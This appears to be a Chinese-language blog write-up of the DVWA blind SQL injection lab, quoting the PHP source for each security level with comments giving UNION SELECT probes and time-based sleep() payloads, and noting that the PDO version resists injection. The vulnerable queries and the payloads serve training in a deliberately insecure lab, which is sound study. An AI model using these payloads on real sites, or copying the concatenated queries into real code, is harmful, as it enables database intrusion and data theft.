---
title: "Sql_injection_blind"
date: 2020-04-10T11:11:22+08:00
tags: ["penetration test"]
draft: false
---

返回的结果集无法看到，只能通过一些页面显示或状态来判断。
像瞎子一样。

DVWA SQL Injection blind 过关秘籍.

### Low

```PHP
if(isset( $_GET[ 'Submit' ])) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    // 没有一点点防备
    // 尝试构造: (由于看不到结果集，所以脱裤子的语句是无效)
    // SELECT first_name, last_name FROM users WHERE user_id = '0' union select 1,2 # ';
    // User ID exists in the database. <存在注入漏洞>
    // SELECT first_name, last_name FROM users WHERE user_id = '0' union select 1,if(length( database())=4,sleep(4),2) # ';

    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    mysql_close();
}
```

### MIEDUM

```PHP
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = mysql_real_escape_string( $id );

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    // 尝试构造:
    // SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,2;
    // 以上判断存在注入漏洞
    // SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,if(length(database()) > 4, sleep(3), 2)

    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}
```

### High

```PHP
if( isset( $_SESSION['id'])){
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    // 没有新花样，只限制输出条目是无法拦住我们的
    // 尝试构造:
    // SELECT first_name, last_name FROM users WHERE user_id = '0' union select 1,if(length(database()) = 4, sleep(3), 2) # LIMIT 1;
    $result = mysql_query( $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    $num = mysql_numrows( $result );
    $i   = 0;
    while( $i < $num ) {
        // Get values
        $first = mysql_result( $result, $i, "first_name" );
        $last  = mysql_result( $result, $i, "last_name" );

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";

        // Increase loop count
        $i++;
    }

    mysql_close();
}
```

### High

```PHP
if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        // PDO 无法注入
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();

        // Get results
        if( $data->rowCount() == 1 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();
```